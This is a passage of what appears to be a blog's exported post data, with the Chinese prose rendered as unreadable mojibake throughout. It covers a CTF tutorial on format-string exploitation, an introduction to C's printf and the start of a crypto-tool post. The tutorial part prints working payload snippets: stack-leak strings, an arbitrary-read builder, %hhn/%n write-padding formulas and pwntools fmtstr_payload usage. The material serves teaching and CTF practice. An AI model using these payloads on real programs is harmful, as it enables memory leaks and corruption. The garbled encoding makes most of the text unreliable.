æº¢å‡ºåˆ°æ ˆ å‰ 6 ä¸ªæ•´æ•°/æŒ‡é’ˆç±»å‚æ•°ï¼šRDI, RSI, RDX, RCX, R8, R9 å‰ 8 ä¸ªæµ®ç‚¹ç±»å‚æ•°ï¼šXMM0â€“XMM7ï¼ˆfloat ä»æå‡ä¸º doubleï¼‰ å˜å‚å‡½æ•°è¿˜ä¼šå‡†å¤‡ä¸€ä¸ªå¯„å­˜å™¨ä¿å­˜åŒºï¼ˆregister save areaï¼‰å’Œæ ˆæº¢å‡ºåŒºï¼ˆoverflow areaï¼‰ã€‚va_list/va_arg ä¼šæŒ‰å‚æ•°ç±»å‹ä»å¯¹åº”åŒºåŸŸé¡ºåºå–å€¼ï¼›å¯„å­˜å™¨åé¢ç”¨å®Œåæ”¹ä»æ ˆä¸Šå–ã€‚ å¯¹åº”ä¸Šé¢çš„ä¾‹å­ï¼Œè°ƒç”¨ç¬é—´å¸¸è§åˆ†é…ä¸ºï¼š RDI = &quot;Int: %d, Float: %f, String: %s\\n&quot;ï¼ˆæ ¼å¼ä¸²ï¼‰ RSI = aï¼ˆ%dï¼‰ XMM0 = b çš„ doubleï¼ˆ%fï¼‰ RDX = strï¼ˆ%sï¼‰ åœ¨64-bitæ¶æ„ä¸‹ä¸æ˜¯æ‰€æœ‰å‚æ•°éƒ½åœ¨æ ˆä¸Šã€‚printf é€šè¿‡ va_list ç»´æŠ¤â€œå½“å‰åƒåˆ°ç¬¬å‡ ä¸ªæ§½ä½â€ï¼ŒæŒ‰ç±»å‹å…ˆä»å¯„å­˜å™¨ä¿å­˜åŒºæ‹¿ï¼Œè¶…å‡ºå†ä»æ ˆæ‹¿ï¼›è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ64-bit ä¸‹åç§»ï¼ˆoffsetï¼‰å’Œ 32-bit ä¸åŒï¼Œå¿…é¡»ç°åœºæ¢æµ‹æˆ–ç”¨ %n$ æ˜¾å¼å‚æ•°åºå·ã€‚ ç‰¹æ®Šæƒ…å†µä»¥åŠåå·®å€¼å½“æˆ‘ä»¬åœ¨ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä½†æœªæä¾›åç»­å®å‚ï¼ˆå³åªç»™äº† fmt ä¸€ä¸ªå‚æ•°ï¼‰æ—¶ï¼š 123456#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello %x %x %x %x&quot;); return 0;&#125; printf åœ¨æ‰«æåˆ°æ¯ä¸ªè½¬æ¢è¯´æ˜ï¼ˆ%...ï¼‰æ—¶ï¼Œä¼šä¾æ® ABI çº¦å®šé€šè¿‡ va_arg æŒ‰é¡ºåºä»å¯å˜å‚æ•°èµ·å§‹ä½ç½®æ£€ç´¢ä¸‹ä¸€å‚æ•°æ§½ä½çš„å†…å®¹ï¼šåœ¨ x86ï¼ˆ32-bitï¼‰ ä¸Šå¯¹åº”ä¸ºæ ˆæ§½ï¼Œåœ¨ x86-64 SysV ä¸Šå¯¹åº”ä¸ºå¯„å­˜å™¨ä¿å­˜åŒºï¼ˆreg_save_areaï¼‰ä»¥åŠæ ˆæº¢å‡ºåŒºï¼ˆoverflow_arg_areaï¼‰ã€‚ ç”±äºè¿™äº›æ§½ä½æœªè¢«æ˜¾å¼èµ‹å€¼ï¼Œè¯»å–åˆ°çš„å°†æ˜¯ç›¸åº”å­˜å‚¨åŒºåŸŸä¸­çš„ç°å­˜ï¼ˆæ®‹å­˜ï¼‰/æœªå®šä¹‰æ•°æ®ï¼Œäºæ˜¯è¢«æŒ‰ %x/%p/%s ç­‰æ ¼å¼è§£é‡Šå¹¶è¾“å‡ºã€‚è¿›ä¸€æ­¥åœ°ï¼Œå½“è¯¥é¡ºåºè¯»å–è¿‡ç¨‹æ¨è¿›åˆ°åŒ…å«æœ¬æ¬¡è¾“å…¥ç¼“å†²åŒºï¼ˆä¾‹å¦‚ä½äºæ ˆã€å †æˆ– .bssï¼‰çš„åœ°å€èŒƒå›´ï¼Œä¸”é¦–æ¬¡å–åˆ°æˆ‘ä»¬é¢„ç½®çš„æ ‡è®°ï¼ˆå¦‚ AAAA...ï¼‰æ—¶ï¼Œè¯¥æ ‡è®°å¯¹åº”çš„å‚æ•°åºå·å°±ç§°ä¸ºåå·®å€¼ kï¼ˆå³ä»â€œç¬¬ä¸€ä¸ªå¯å˜å‚æ•°æ§½ä½â€å¼€å§‹è®¡æ•°ï¼Œåˆ°é¦–æ¬¡å‘½ä¸­æ ‡è®°ä¹‹é—´çš„æ§½ä½æ•°é‡ï¼‰ã€‚è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å³å¯ä½¿ç”¨æ˜¾å¼å‚æ•°åºå·ï¼ˆå¦‚ %k$p, %k$s, %k$nï¼‰ç¨³å®šåœ°æŒ‡å‘ç›®æ ‡æ§½ä½è¿›è¡Œæ³„éœ²æˆ–å†™å…¥ã€‚ æ¼æ´è¡¨ç°åœ¨CTFçš„é¢˜ç›®é‡Œè¿™ä¸ªæ¼æ´ä¸€èˆ¬çš„è¡¨ç°å¦‚ä¸‹ï¼š 12345678#include &lt;stdio.h&gt;int main() &#123; char buf[100]; fgets(buf, sizeof(buf), stdin); printf(buf); // ä¼šå°†æˆ‘ä»¬çš„è¾“å…¥ç›´æ¥å½“æˆæ ¼å¼å­—ç¬¦ä¸²å¹¶å¤„ç† return 0;&#125; æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è¯»å–æ ˆä¸Šçš„å†…å®¹ï¼ˆå¦‚å˜é‡å€¼ã€è¿”å›åœ°å€ç­‰ï¼‰æˆ–è€…é€šè¿‡ %n æ ¼å¼ç¬¦ï¼ˆå°±æ˜¯æˆ‘ä»¬ä¹‹å‰æåˆ°çš„é‚£ä¸ªå±é™©çš„æ ¼å¼ç¬¦ï¼‰å‘æŒ‡å®šå†…å­˜åœ°å€å†™å…¥æ•°æ®ã€‚ ExploitæŠ€å·§è¯»å–æ ˆä¸Šçš„å†…å®¹12printf(&quot;%x %x %x&quot;);// bffff5c4 80484f0 1 12printf(&quot;%p %p %p&quot;);// 0xbffff5c4 0x80484f0 0x1 %x ï¼šä»¥åå…­è¿›åˆ¶æ•´æ•°å½¢å¼è¾“å‡ºæ ˆä¸Šçš„å†…å®¹ã€‚ %p ï¼šä»¥æŒ‡é’ˆå½¢å¼ï¼ˆåå…­è¿›åˆ¶åœ°å€ï¼‰è¾“å‡ºæ ˆä¸Šçš„å†…å®¹ã€‚ 123payload = b&quot;%p &quot; * 40payload = b&quot;%x &quot; * 40 æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨%n$pï¼š 1payload = &quot;%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p&quot; 1payload = &quot; &quot;.join([f&quot;%&#123;i&#125;$p&quot; for i in range(1, 61)]).encode() è¯»å–ä»»æ„åœ°å€çš„å­—ç¬¦ä¸² %sï¼šæŠŠ æ ˆä¸Šçš„å€¼å½“æˆä¸€ä¸ªæŒ‡é’ˆåœ°å€ï¼Œå¹¶å°è¯•æ‰“å°è¿™ä¸ªåœ°å€æŒ‡å‘çš„å†…å­˜ï¼Œç›´åˆ°é‡åˆ° \\0ã€‚ å‡è®¾æ ˆä¸ŠæŸä¸ªå‚æ•°çš„å€¼æ˜¯ï¼š 10x08049000 â†’ æŒ‡å‘ &quot;HelloWorld&quot; ç”¨ %xå’Œ%pä¼šè¾“å‡º 1280490000x8049000 ç”¨%såˆ™ä¼šè¾“å‡º 12printf(&quot;%s&quot;);HelloWorld ä¸€èˆ¬æµç¨‹ ç¡®å®šåç§»Sï¼ˆoffsetï¼‰ï¼š è¾“å…¥å½¢å¦‚ AAAA,%p,%p,%p... çœ‹ç¬¬å‡ ä¸ª %p èƒ½è¯»å‡ºæˆ‘ä»¬å¯æ§çš„æ ‡è®°ï¼ˆæ¯”å¦‚ 0x41414141ï¼‰ï¼Œå¾—åˆ°åç§» Sã€‚ ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•æ„é€ payload å‡å¦‚æˆ‘ä»¬ç¡®å®šäº†åç§»ï¼Œå¹¶ä¸”çŸ¥é“äº†flagçš„å…·ä½“åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥ç”¨ä»¥ä¸‹çš„payloadç›´æ¥è¯»å–flagçš„å†…å®¹ï¼š 123def fmt_read_addr_payload(offset, addr, k=1): fmt = f&quot;%&#123;offset + k&#125;$s&quot;.encode() return fmt + b&quot;A&quot;*(8 * k - len(fmt)) + p64(addr) å…¶ä¸­ï¼š offsetæ˜¯æˆ‘ä»¬ç¡®å®šçš„åç§» addræ˜¯æˆ‘ä»¬å¸Œæœ›è¯»å–çš„å†…å®¹çš„åœ°å€ 8*kä¸»è¦ç”¨äºå¯¹é½ã€‚ï¼ˆå¦‚æœk=1ä¸è¡Œï¼Œå¯ä»¥å°è¯•k=4ï¼Œè²Œä¼¼æ¯”è¾ƒç¨³ã€‚ï¼‰ å› ä¸ºp64(addr) ç›´æ¥æ¥åœ¨æ ¼å¼ä¸²åé¢ï¼Œå¦‚æœæ²¡æœ‰æŒ‰8å­—èŠ‚å¯¹é½ï¼Œå®ƒå¤§æ¦‚ç‡ä¸ä¼šæ­£å¥½è½åœ¨ç¬¬offsetä¸ªæ§½ä½ä¸Šï¼Œä¹Ÿå°±ä¼šå¯¼è‡´è¯»å–å‡ºé—®é¢˜ã€‚ å†™å…¥ä¸€èˆ¬æµç¨‹ ç¡®å®šåç§» Sï¼ˆoffsetï¼‰ï¼š è¾“å…¥å½¢å¦‚ AAAA,%p,%p,%p... çœ‹ç¬¬å‡ ä¸ª %p èƒ½è¯»å‡ºæˆ‘ä»¬å¯æ§çš„æ ‡è®°ï¼ˆæ¯”å¦‚ 0x41414141ï¼‰ï¼Œå¾—åˆ°åç§» Sã€‚ æ”¾ç½®ç›®æ ‡åœ°å€ï¼ˆé¿å…\\x00æˆªæ–­ï¼‰ï¼š æŠŠâ€œæ ¼å¼åŒ–æŒ‡ä»¤ï¼ˆå…¨ ASCIIï¼‰â€æ”¾åœ¨å‰é¢ï¼› æŠŠç›®æ ‡åœ°å€ï¼ˆæˆ–ä¸€ä¸²åœ°å€ï¼‰æ”¾åœ¨ payload æœ«å°¾ï¼› ç”¨ä½ç½®å‚æ•°%K$... æ¥ç‚¹åè¿™äº›åœ°å€ï¼ˆK ä» S + ceil(len(fmt_ascii)/8) èµ·ï¼‰ã€‚ å¯¹é½/paddingï¼š written = åˆ°å½“å‰ä¸ºæ­¢å·²è¾“å‡ºå­—ç¬¦æ•°ï¼› ç›®æ ‡å€¼ wantï¼ˆå¸Œæœ›è¢«å†™å…¥åˆ°å†…å­˜é‡Œçš„æ•°å€¼ï¼ŒæŒ‰å†™å…¥å®½åº¦å–æ¨¡ï¼‰ï¼› è®¡ç®—ï¼š 1234567base = 256 #ï¼ˆ%hhnï¼Œ1å­—èŠ‚ï¼‰base = 65536 #ï¼ˆ%hnï¼Œ2å­—èŠ‚ï¼‰base = 2**32 #ï¼ˆ%nï¼Œ4å­—èŠ‚ï¼‰base = 2**64 #ï¼ˆ%ln/%llnï¼Œ8å­—èŠ‚ï¼‰pad = (want - (written % base)) % base# å¦‚æœ pad == 0ï¼Œä¸ºäº†ç¨³å¦¥å¯ç”¨ pad = baseï¼ˆç­‰ä»·â€œåŠ  0â€ï¼‰ baseä¸ºå–å€¼èŒƒå›´ï¼Œåˆ†åˆ«ç­‰äº1ï¼Œ2ï¼Œ4ï¼Œ8å­—èŠ‚çš„æœ€å¤§å€¼ã€‚ ç„¶åè¾“å‡º %padcï¼ˆæˆ–å…¶ä»–ç­‰ä»·æ–¹å¼ï¼‰æŠŠ written è°ƒåˆ°æƒ³è¦çš„å€¼ã€‚ æ‰§è¡Œå†™å…¥ï¼š %K$hhn å†™ 1 å­—èŠ‚ %K$hn å†™ 2 å­—èŠ‚ %K$n å†™ 4 å­—èŠ‚ï¼ˆint*ï¼‰ %K$ln/%K$lln å†™ 8 å­—èŠ‚ï¼ˆlong*/long long*ï¼Œåœ¨ x86_64 éƒ½æ˜¯ 8Byteï¼‰ å¯¹ %hn/%n/%ln è¿™ç±»å¤šå­—èŠ‚å†™ï¼Œæœ€å¥½æŒ‰â€œä»å°åˆ°å¤§â€çš„ç›®æ ‡å€¼æ’åºå†™å…¥ï¼Œé¿å… padding éœ€è¦â€œå›ç»•â€åˆ°å¾ˆå¤§çš„æ•°ã€‚æˆ–è€…ç›´æ¥ç”¨é€å­—èŠ‚å†™ %hhnã€‚ å†™ 1 å­—èŠ‚ï¼ˆ%hhnï¼‰ç¤ºä¾‹ 1ï¼šæŠŠ pwnme_addr çš„æœ€ä½ 1 å­—èŠ‚å†™æˆ 0x90å‡è®¾å·²ç»æµ‹å¾—åç§» S = 10ï¼Œå¹¶ç”¨ BASE = S + ceil(len(fmt_ascii)/8) è®¡ç®—å‡ºç¬¬ä¸€ä¸ªåœ°å€æ˜¯ç¬¬ K=BASE ä¸ªå‚æ•°ä½ã€‚ 123456# ç›®æ ‡ï¼š*(uint8_t*)pwnme_addr = 0x90# åªéœ€è®© written % 256 == 0x90 (=144)payload =b&quot;%144c&quot; # written += 144b&quot;%K$hhn&quot; # æŠŠ (written%256)=0x90 å†™è¿›ç¬¬ K ä¸ªå‚æ•°æŒ‡å‘çš„åœ°å€+ p32(pwnme_addr); è‹¥æ­¤æ—¶ written % 256 ä¸æ˜¯ä» 0 å¼€å§‹ï¼Œç…§å…¬å¼ç®—ï¼špad = (0x90 - (written%256)) % 256ï¼Œç”¨ %padc å½¢æˆ paddingã€‚ fmtstr_payloadPwntoolsé‡Œæœ‰ç°æˆçš„é«˜æ•ˆæ„é€ è¿™ç§payloadçš„å‡½æ•°ï¼š 1fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;) ï¼ˆå®˜æ–¹æ–‡æ¡£ï¼šhttps://docs.pwntools.com/en/dev/fmtstr.html ï¼‰ å‚æ•°ï¼ˆæ‘˜è¯‘ï¼‰ï¼š offsetï¼šç¬¬ä¸€ä¸ªå¯æ§â€œå‚æ•°æ§½â€çš„ä½ç½®ï¼ˆå³ä½ æµ‹å‡ºæ¥çš„ %n$p èµ·ç‚¹ï¼‰ã€‚ writesï¼šè¦å†™å…¥çš„ç›®æ ‡ï¼Œå­—å…¸ &#123;address: value, ...&#125;ã€‚ï¼ˆå°†valueå†™è¿›addressé‡Œï¼‰ numbwrittenï¼šè°ƒç”¨ printf å‰å·²ç»è¾“å‡ºçš„å­—èŠ‚æ•°ï¼ˆå½±å“å¯¹é½/å¡«å……è®¡ç®—ï¼‰ã€‚ write_sizeï¼šåŸå­å†™å…¥ç²’åº¦ï¼Œ&#39;byte&#39;|&#39;short&#39;|&#39;int&#39;|&#39;long&#39; ç­‰ã€‚ ç¡®å®šåå·®ç”±äºè¯»å–å‡½æ•°å°†è¾“å…¥çš„å†…å®¹å­˜å‚¨çš„ä½ç½®å’Œè¾“å‡ºå‡½æ•°è¯»å–çš„ä½ç½®æœ‰æ‰€åå·®ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬éœ€è¦ç”¨ 1test_payload = b&quot;AAAA&quot; + 15*b&quot;,%x&quot; è¿™æ ·çš„Payloadæ¥ç¡®å®šè¿™ä¸ªåå·®å…·ä½“çš„å€¼ã€‚ ä¾‹é¢˜ æ”»é˜²ä¸–ç•Œ CGfsb Writeup","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","permalink":"https://archer-baiyi.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"Format String","slug":"Format-String","permalink":"https://archer-baiyi.github.io/tags/Format-String/"}]},{"title":"Cè¯­è¨€å…¥é—¨","slug":"ç¼–ç¨‹/Cè¯­è¨€å…¥é—¨","date":"2025-05-18T20:28:18.000Z","updated":"2025-05-19T08:07:22.657Z","comments":true,"path":"2025/05/18/ç¼–ç¨‹/Cè¯­è¨€å…¥é—¨/","permalink":"https://archer-baiyi.github.io/2025/05/18/%E7%BC%96%E7%A8%8B/C%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/","excerpt":"","text":"åŸºç¡€Hello Worldè€è§„çŸ©æˆ‘ä»¬è¿˜æ˜¯å…ˆæ¥çœ‹ä¸€ä¸‹åœ¨Cè¯­è¨€é‡Œæ˜¯æ€ä¹ˆå†™ Hello World çš„ï¼š 123456#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello, World!\\n&quot;); return 0;&#125; å…¶ä¸­ï¼š #include &lt;stdio.h&gt;ï¼šå¼•å…¥æ ‡å‡†è¾“å…¥è¾“å‡ºåº“ï¼Œprintf å°±åœ¨è¿™é‡Œé¢å®šä¹‰ã€‚ includeçš„éƒ¨åˆ†ä¸€èˆ¬è¢«å«åšå¤´æ–‡ä»¶ã€‚ int main()ï¼šç¨‹åºçš„ä¸»å‡½æ•°ï¼Œæ˜¯ç¨‹åºæ‰§è¡Œçš„èµ·ç‚¹ã€‚ printf(&quot;Hello, World!\\n&quot;);ï¼šå‘å±å¹•è¾“å‡º Hello, World!ï¼Œ\\n è¡¨ç¤ºæ¢è¡Œã€‚ return 0;ï¼šè¡¨ç¤ºç¨‹åºæ­£å¸¸ç»“æŸã€‚ printf()printf æ˜¯ C æ ‡å‡†åº“å‡½æ•°ï¼Œç”¨äºæ ¼å¼åŒ–æ–‡æœ¬å¹¶å°†å…¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚ å®ƒçš„è¯­æ³•ç›¸æ¯”äºå…¶ä»–çš„ç¼–ç¨‹è¯­è¨€ï¼ˆæ¯”å¦‚è¯´Pythonï¼ŒC++ä¹‹ç±»çš„ï¼‰ä¼šå¤æ‚å¾ˆå¤šã€‚ printfçš„å‚æ•°ä¸»è¦åˆ†æˆ2éƒ¨åˆ†ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ä»¥åŠå˜é‡åã€‚å…¶ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆ format stringï¼‰å¯ä»¥å‚è€ƒä»¥ä¸‹å®šä¹‰ï¼ˆæˆ‘ä¸ªäººè§‰å¾—è¿™ä¸ªå®šä¹‰æ¯”è¾ƒæ¸…æ¥šï¼‰ï¼š The format string is a character string which contains two types of objects: plain characters, which are simply copied to the output channel, and conversion specifications, each of which causes conversion and printing of arguments. ï¼ˆæ¥æºï¼šhttps://ocaml.org/manual/5.0/api/Printf.htmlï¼‰ æˆ‘ä»¬æ¥åˆ†æƒ…å†µçœ‹ä¸€ä¸‹printfçš„å…·ä½“è¯­æ³•ï¼š 1. åªæœ‰å­—ç¬¦ä¸²çš„æƒ…å†µï¼š 123456# include &lt;stdio.h&gt;int main(void)&#123; printf(&quot;Hello World!\\n&quot;); // \\nè¡¨ç¤ºæ¢è¡Œ return 0;&#125; è¿™ç§æƒ…å†µä¸‹å°±éå¸¸ç®€å•ï¼Œç›´æ¥åœ¨å¼•å·é‡Œè¾“å…¥å¸Œæœ›è¾“å‡ºçš„å†…å®¹å³å¯ã€‚ 2. æ¶‰åŠå˜é‡çš„æƒ…å†µï¼š 1234567# include &lt;stdio.h&gt;int main(void)&#123; int i = 10; printf(&quot;%d\\n&quot;, i); // %dæ˜¯è¾“å‡ºæ§åˆ¶ç¬¦ï¼Œd è¡¨ç¤ºåè¿›åˆ¶ï¼Œåé¢çš„ i æ˜¯è¾“å‡ºå‚æ•°* return 0;&#125; æˆ‘ä»¬éœ€è¦åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆ format stringï¼‰é‡Œç»™å®šç¬¦åˆè¦æ±‚çš„æ ¼å¼åŒ–ã€‚ æ ¼å¼åŒ–å ä½ç¬¦çš„è¯­æ³•å¦‚ä¸‹ï¼š 1%[parameter][flags][field width][.precision][length]type - Parameterï¼šæŒ‡å®šç”¨äºæ ¼å¼åŒ–çš„å‚æ•°ä½ç½®ï¼ˆä»1å¼€å§‹ï¼‰ å­—ç¬¦ è¯´æ˜ n$ å…¶ä¸­næ˜¯å‚æ•°ä½ç½® ä¾‹å­ï¼š 12printf(&quot;%2$d %1$d&quot;, 11, 22);// ä¼šè¾“å‡º 22 11 - Flagsï¼š æ ‡å¿— è¯´æ˜ - å·¦å¯¹é½ï¼ˆé»˜è®¤æ˜¯å³å¯¹é½ï¼‰ + æ€»æ˜¯æ˜¾ç¤ºæ­£å·æˆ–è´Ÿå·ï¼ˆä¾‹å¦‚ +10ï¼‰ (ç©ºæ ¼) æ­£æ•°å‰åŠ ç©ºæ ¼ï¼Œè´Ÿæ•°å‰åŠ è´Ÿå· 0 ç”¨0å¡«å……æœªå æ»¡çš„å®½åº¦ # å¯¹äº%oã€%xã€%Xç­‰ï¼Œæ·»åŠ å‰ç¼€ï¼ˆå¦‚0xï¼‰ï¼›å¯¹äº%fç­‰ï¼Œå§‹ç»ˆåŒ…å«å°æ•°ç‚¹ - Field Widthï¼šæŒ‡å®šæœ€å°è¾“å‡ºå­—ç¬¦æ•°ï¼Œä¸è¶³æ—¶ç”¨ç©ºæ ¼ï¼ˆæˆ–0ï¼‰å¡«å……ï¼Œå¦‚æœè¦ä½¿ç”¨å˜é‡æŒ‡å®šå®½åº¦ï¼Œå¯ä»¥ç”¨ *ã€‚ ä¾‹å­ï¼š 12345printf(&quot;%d&quot;, 42);// ä¼šè¾“å‡º &quot; 42&quot; ï¼ˆå‰é¢æœ‰3ä¸ªç©ºæ ¼ï¼‰printf(&quot;%*d&quot;, 5, 42);// ä¼šè¾“å‡º &quot; 42&quot; ï¼ˆå‰é¢æœ‰3ä¸ªç©ºæ ¼ï¼‰ - Precisionï¼šæŒ‡å®šæ•°å­—å°æ•°ç‚¹åçš„ä½æ•°æˆ–å­—ç¬¦ä¸²çš„æœ€å¤§è¾“å‡ºé•¿åº¦ï¼š å¯¹äºæµ®ç‚¹æ•°ï¼ˆå¦‚ %fï¼‰ï¼šè¡¨ç¤ºå°æ•°ç‚¹åä¿ç•™çš„ä½æ•°ï¼Œå¦‚ %.2f å¯¹äºå­—ç¬¦ä¸²ï¼ˆå¦‚ %sï¼‰ï¼šè¡¨ç¤ºæœ€å¤§è¾“å‡ºå­—ç¬¦æ•°ï¼Œå¦‚ %.5s å¯ä»¥ä½¿ç”¨ * è¡¨ç¤ºç”±å‚æ•°åŠ¨æ€æä¾› - Lengthï¼šæŒ‡å‡ºæµ®ç‚¹å‹å‚æ•°æˆ–æ•´å‹å‚æ•°çš„é•¿åº¦ ä¿®é¥°ç¬¦ è¯´æ˜ hh signed char æˆ– unsigned char h short æˆ– unsigned short l long æˆ– unsigned long ll long long æˆ– unsigned long long L long doubleï¼ˆç”¨äº%Lfï¼‰ z size_t t ptrdiff_t j intmax_t æˆ– uintmax_t ä¾‹å­ï¼š 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;int main() &#123; signed char a = -5; printf(&quot;%hhd\\n&quot;, a); // ä¼šè¾“å‡º &quot;-5&quot; short s = 32000; printf(&quot;%hd\\n&quot;, s); // ä¼šè¾“å‡º &quot;32000&quot; long l = 123456789L; printf(&quot;%ld\\n&quot;, l); // ä¼šè¾“å‡º &quot;123456789&quot; long long ll = 9223372036854775807LL; printf(&quot;%lld\\n&quot;, ll); // ä¼šè¾“å‡º &quot;9223372036854775807&quot; long double ld = 3.141592653589793238L; printf(&quot;%Lf\\n&quot;, ld); // ä¼šè¾“å‡º &quot;3.141593&quot;ï¼ˆé»˜è®¤ä¿ç•™6ä½å°æ•°ï¼‰ size_t sz = 100; printf(&quot;%zu\\n&quot;, sz); // ä¼šè¾“å‡º &quot;100&quot; ptrdiff_t diff = -8; printf(&quot;%td\\n&quot;, diff); // ä¼šè¾“å‡º &quot;-8&quot; intmax_t im = 9223372036854775807; printf(&quot;%jd\\n&quot;, im); // ä¼šè¾“å‡º &quot;9223372036854775807&quot; return 0;&#125; - Typeï¼šä¹Ÿç§°è½¬æ¢è¯´æ˜ï¼ˆconversion specification/specifierï¼‰ï¼ŒæŒ‡å®šå…·ä½“çš„æ•°æ®ç±»å‹ï¼Œæœ‰ä»¥ä¸‹é€‰æ‹© å­—ç¬¦ è¯´æ˜ %d æ‰“å°åè¿›åˆ¶æ•´æ•°ï¼ˆintï¼‰ %f æ‰“å°æµ®ç‚¹æ•°ï¼ˆfloat/doubleï¼‰ %.2f æ‰“å°æµ®ç‚¹æ•°ï¼Œä¿ç•™å°æ•°ç‚¹å2ä½ %s æ‰“å°å­—ç¬¦ä¸²ï¼ˆchar*ï¼‰ %c æ‰“å°å•ä¸ªå­—ç¬¦ï¼ˆcharï¼‰ %x æ‰“å°åå…­è¿›åˆ¶ï¼ˆå°å†™ï¼‰ %% è¾“å‡ºä¸€ä¸ªç™¾åˆ†å· % å…¶ä¸­åªæœ‰Typeæ˜¯å¿…é¡»è¦ç»™çš„ï¼Œå…¶ä»–å‡å¯ä»¥çœç•¥ã€‚ ä¾‹å­ï¼š 1234567891011121314151617181920#include &lt;stdio.h&gt;int main() &#123; int i = 123; float pi = 3.14159; char letter = &#x27;A&#x27;; char name[] = &quot;hello&quot;; int hex = 255; printf(&quot;æ•´æ•°ï¼š%d\\n&quot;, i); printf(&quot;æµ®ç‚¹æ•°ï¼ˆé»˜è®¤ï¼‰ï¼š%f\\n&quot;, pi); printf(&quot;æµ®ç‚¹æ•°ï¼ˆä¿ç•™ä¸¤ä½ï¼‰ï¼š%.2f\\n&quot;, pi); printf(&quot;å­—ç¬¦ä¸²ï¼š%s\\n&quot;, name); printf(&quot;å­—ç¬¦ï¼š%c\\n&quot;, letter); printf(&quot;åå…­è¿›åˆ¶ï¼š%x\\n&quot;, hex); printf(&quot;ç™¾åˆ†å·ï¼š%%\\n&quot;); return 0;&#125; æ³¨æ„ï¼šåœ¨ç¬¬äºŒéƒ¨åˆ†ä¸€å®šè¦ç»™å®šå˜é‡ï¼Œå¦‚æœæ²¡æœ‰ç»™ï¼Œåˆ™ä¼šä»é”™è¯¯çš„å†…å­˜åœ°å€è¯»å–æ•°æ®ï¼Œå¯¼è‡´ä¸å¯é¢„æœŸçš„è¡Œä¸ºã€‚ æ­¤å¤–è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„æ ¼å¼ç¬¦ï¼š%n ã€‚è¿™ä¸ªæ ¼å¼ç¬¦ä¼šè®© printf æŠŠå½“å‰å·²ç»æ‰“å°çš„å­—ç¬¦æ•°é‡å†™å…¥ n æ‰€åœ¨çš„åœ°å€ã€‚ æ¯”å¦‚è¯´ä¸‹é¢è¿™ä¸ªä¾‹å­ 12345678#include &lt;stdio.h&gt;int main() &#123; int n; printf(&quot;hello%n&quot;, &amp;n); return 0;&#125; nçš„å€¼ä¼šè¢«å­˜å‚¨ä¸º5ã€‚ ç”±äºå®ƒçš„ç‰¹æ®Šæ€§ä»¥åŠå±é™©æ€§ï¼Œå¾ˆå¤šç°ä»£ç³»ç»Ÿåœ¨ libc ä¸­ç¦ç”¨äº† %nï¼Œæˆ–è€…åœ¨æ ¼å¼åŒ–å‡½æ•°ä¸Šå¢åŠ äº†ä¿æŠ¤ï¼ˆå¦‚ glibc ä¸­å¯¹ %n çš„æ ¼å¼æ£€æŸ¥ï¼‰ã€‚","categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"}]},{"title":"CryptexLab CTFå¯†ç å­¦å·¥å…·","slug":"CTF/Crypto/CryptexLab-CTFå¯†ç å­¦å·¥å…·","date":"2025-05-18T15:24:15.000Z","updated":"2025-10-12T10:11:52.886Z","comments":true,"path":"2025/05/18/CTF/Crypto/CryptexLab-CTFå¯†ç å­¦å·¥å…·/","permalink":"https://archer-baiyi.github.io/2025/05/18/CTF/Crypto/CryptexLab-CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E5%B7%A5%E5%85%B7/","excerpt":"","text":"åŠŸèƒ½ç›®å‰æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š ç¼–ç ï¼š ç¼–ç ï¼š å¯é€‰ç¼–ç æ–¹å¼ï¼šBase64ï¼ŒBase32ï¼ŒBase58ï¼ŒBase91ï¼ŒBinaryï¼ŒHex è§£ç  å¯ä»¥è‡ªåŠ¨è¿›è¡Œå¤šè½®çš„base 32ï¼Œ58ï¼Œ64ï¼Œï¼ˆ91ï¼Œå¯é€‰ï¼‰ï¼ŒäºŒè¿›åˆ¶ä»¥åŠhexè§£ç  å¤å…¸å¯†ç ï¼š æ …æ å¯†ç  æ ¹æ®ç»™å®šçš„å¯†é’¥ï¼ˆæ æ•°ï¼‰è¿›è¡ŒåŠ è§£å¯† å‡¯æ’’å¯†ç ï¼š ç»™å®šå¯†æ–‡ä»¥åŠå¯†é’¥è¿›è¡Œè§£å¯† ç»™å®šå¯†æ–‡ï¼Œè¿›è¡Œéå†è§£å¯† ç»™å®šå¯†æ–‡ä»¥åŠå…³é”®è¯ï¼Œæ 